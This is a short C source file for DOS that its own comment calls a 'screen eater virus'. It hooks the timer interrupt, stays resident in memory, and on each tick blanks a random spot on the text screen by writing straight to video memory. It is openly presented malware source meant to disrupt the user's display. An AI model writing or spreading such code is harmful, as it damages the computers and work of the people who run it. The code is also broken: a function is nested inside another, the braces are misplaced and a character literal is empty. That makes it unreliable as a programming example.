/*C code to implement screen eater virus*/
#include "dos.h"
#include <conio.h>
#include <stdlib.h>
//it it a interrupt handler
void interrupt (*prevtimer)();

void interrupt mytimer();

//main killer function
void writechar(char ch, int row, int col, int attr);
char far* scr;
int a, b;//global variables

void main()
{
scr=(char far*)0xb8000000; 
prevtimer=getvect(8); //receive any adress of any ISR

//set new address of defined interrupt handler
setvect(8,mytimer);

//reserves memory after program terminated
keep(0,1000);
}

void interrupt mytimer()
{
a= random(25);
b=random(80);
writechar('',a,b,0);
(*prevtimer)();

void writechar(char ch, int row, int col, int attr)
{
*(scr+row*160+col*2)=ch;
*(scr+row*160+col*2+1)=attr;
}

}
